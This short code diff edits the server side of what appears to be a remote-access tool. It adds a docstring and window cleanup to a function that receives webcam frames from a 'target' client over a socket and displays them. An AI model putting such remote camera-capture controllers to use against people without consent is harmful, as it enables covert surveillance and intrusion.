@@ -201,12 +201,24 @@ def get_file(command, conn):
             break
 
 def get_camera(cmd, conn):
+    """
+    The function gets an image from the client through the socket
+    and shows it on the screen
+
+    :param cmd: The command with the file name
+    :type cmd: str
+
+    :param conn: a connection
+
+    :return: None
+    """
     frame_data = conn.recv(4000000)
     frame = numpy.fromstring(frame_data, dtype=numpy.uint8)
     frame = frame.reshape(480, 640, 3)
     cv2.imshow("Capturing", frame)
     key = cv2.waitKey(0)
-
+    if key:
+        cv2.destroyAllWindows()
 
 
 def send_target_commands(conn):
